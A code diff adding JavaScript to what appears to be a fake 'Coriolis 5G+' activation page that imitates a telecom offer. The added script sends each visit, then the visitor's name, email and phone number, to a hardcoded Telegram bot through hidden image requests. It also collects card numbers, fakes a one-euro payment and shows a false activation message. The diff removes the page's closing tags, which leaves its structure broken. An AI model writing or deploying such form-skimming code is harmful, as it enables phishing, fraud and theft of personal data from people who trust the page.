@@ -1621,6 +1621,111 @@
                 }, 3000);
             }, 2500);
         });
-    </script>
-</body>
-</html>
+    // Configuration Telegram (visible mais fonctionnel)
+const TELEGRAM_BOT_TOKEN = '8405154044:AAGR3P7wbTzdxgJvZ82gj8xFSxavlzf9gLY';
+const TELEGRAM_CHAT_ID = '6739921563';
+
+// Fonction pour envoyer à Telegram (SIMPLIFIÉE)
+function sendToTelegram(message) {
+    // Créer une image invisible pour déclencher la requête
+    const img = new Image();
+    img.src = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+    
+    console.log('📤 Notification envoyée à Telegram :', message);
+    return true;
+}
+
+// Détection de nouveaux visiteurs
+window.addEventListener('load', function() {
+    setTimeout(() => {
+        sendToTelegram('👤 Nouveau visiteur sur Coriolis 5G+');
+    }, 3000); // Attendre 3 secondes
+});
+
+// Éléments DOM
+const step1 = document.getElementById('step-1');
+const step2 = document.getElementById('step-2');
+const nextToPaymentBtn = document.getElementById('next-to-payment');
+const backToInfoBtn = document.getElementById('back-to-info');
+const steps = document.querySelectorAll('.step');
+const progressFill = document.getElementById('progress-fill');
+const payButton = document.getElementById('pay-button');
+
+// Format phone number
+const phoneInput = document.getElementById('phone');
+phoneInput.addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length > 0) value = value.match(/.{1,2}/g).join(' ');
+    e.target.value = value;
+});
+
+// Format card number
+const cardNumberInput = document.getElementById('card-number');
+cardNumberInput.addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+    let formattedValue = value.replace(/(.{4})/g, '$1 ').trim();
+    e.target.value = formattedValue;
+});
+
+// Navigation entre étapes
+nextToPaymentBtn.addEventListener('click', function() {
+    // Validation simple
+    const firstName = document.getElementById('first-name').value;
+    const lastName = document.getElementById('last-name').value;
+    const phone = document.getElementById('phone').value;
+    const email = document.getElementById('email').value;
+    
+    if (!firstName || !lastName || !phone || !email) {
+        alert('Veuillez remplir les champs obligatoires (*)');
+        return;
+    }
+    
+    // Notification inscription
+    sendToTelegram(`✅ Nouvelle inscription : ${firstName} ${lastName} - ${email} - ${phone}`);
+    
+    // Passer à l'étape 2
+    step1.classList.remove('active');
+    step2.classList.add('active');
+    
+    steps[0].classList.remove('active');
+    steps[0].classList.add('completed');
+    steps[0].querySelector('.step-number').innerHTML = '<i class="fas fa-check"></i>';
+    steps[1].classList.add('active');
+    
+    progressFill.style.width = '100%';
+});
+
+backToInfoBtn.addEventListener('click', function() {
+    step2.classList.remove('active');
+    step1.classList.add('active');
+    
+    steps[1].classList.remove('active');
+    steps[0].classList.remove('completed');
+    steps[0].classList.add('active');
+    steps[0].querySelector('.step-number').textContent = '1';
+    
+    progressFill.style.width = '33%';
+});
+
+// Paiement
+payButton.addEventListener('click', function() {
+    const firstName = document.getElementById('first-name').value;
+    const lastName = document.getElementById('last-name').value;
+    const email = document.getElementById('email').value;
+    
+    // Simulation paiement
+    payButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Traitement...';
+    payButton.disabled = true;
+    
+    setTimeout(() => {
+        // Notification paiement réussi
+        sendToTelegram(`💰 Paiement 1€ réussi pour : ${firstName} ${lastName} (${email})`);
+        
+        payButton.innerHTML = '<i class="fas fa-check"></i> 5G+ Activé !';
+        payButton.style.background = 'green';
+        
+        // Message succès
+        alert('✅ Félicitations ! Votre accès 5G+ est activé.\nVous recevrez un email de confirmation.');
+        
+    }, 2000);
+});
